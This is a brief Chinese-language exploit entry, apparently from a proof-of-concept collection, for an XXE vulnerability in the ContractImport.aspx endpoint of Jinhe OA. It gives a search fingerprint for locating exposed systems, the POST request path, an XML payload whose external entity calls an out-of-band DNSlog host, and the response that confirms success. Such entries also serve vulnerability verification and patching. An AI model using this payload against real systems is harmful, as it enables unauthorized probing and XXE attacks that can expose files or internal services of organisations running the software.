# 金和OAContractImport.aspx存在XXE漏洞

金和OA ｜ XXE ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /c6/JHSoft.Web.ContractManagement/Importing/ContractImport.aspx/ HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```
- **响应特征**：200 Dnslog回显